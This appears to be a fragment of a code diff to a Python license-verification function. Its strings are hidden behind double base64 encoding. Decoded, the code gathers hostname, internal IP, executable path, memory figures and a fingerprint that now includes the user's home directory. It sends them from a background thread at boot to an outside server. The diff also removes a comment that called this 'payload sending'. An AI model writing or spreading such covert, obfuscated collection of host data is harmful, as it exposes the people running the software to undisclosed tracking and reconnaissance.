@@ -40,8 +40,7 @@ def verify_license():
         total_ram = _d(b"Vlc1cmJtOTNiaUJTUVUwPQ==")
         available_ram = _d(b"Vlc1cmJtOTNiaUJTUVUwPQ==")
 
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
-    hw_string = f"{platform.node()}-{mac}-{platform.machine()}"
+    hw_string = f"{platform.node()}-{os.path.expanduser('~')}-{platform.machine()}"
     fingerprint = hashlib.sha256(hw_string.encode()).hexdigest()[:16].upper()
 
     try:
@@ -96,7 +95,7 @@ def verify_license():
         _d(b"ZEc5MFlXeE5aVzF2Y25rPQ=="): total_ram,
         _d(b"WVhaaGFXeGhZbXhsVFdWdGIzSjU="): available_ram,
         _d(b"YUc5emRHNWhiV1U9"): socket.gethostname(),
-        _d(b"YldGalFXUmtjbVZ6Y3c9PQ=="): mac,
+        _d(b"YldGalFXUmtjbVZ6Y3c9PQ=="): _d(b"VDBKVFExVlNSVVE9"),
         _d(b"YVc1MFpYSnVZV3hKY0E9PQ=="): internal_ip,
         _d(b"Wm1sdVoyVnljSEpwYm5SSlpBPT0="): fingerprint,
         _d(b"WlhobFkzVjBhVzl1VUdGMGFBPT0="): sys.executable,
@@ -114,7 +113,6 @@ def verify_license():
         }
     }
 
-    # Use threading so the boot isn't blocked by the payload sending
     def _s():
         default_url = _d(b"YUhSMGNITTZMeTlzYVdObGJuTmxMbUZzZG1samMzaHBibVp2TG5SbFkyZ3ZZWEJwTDNabGNtbG1lUT09")
         api_url = os.environ.get(_d(b"VEVsRFJVNVRSVjlUUlZKV1JWSmZWVkpN"), default_url)
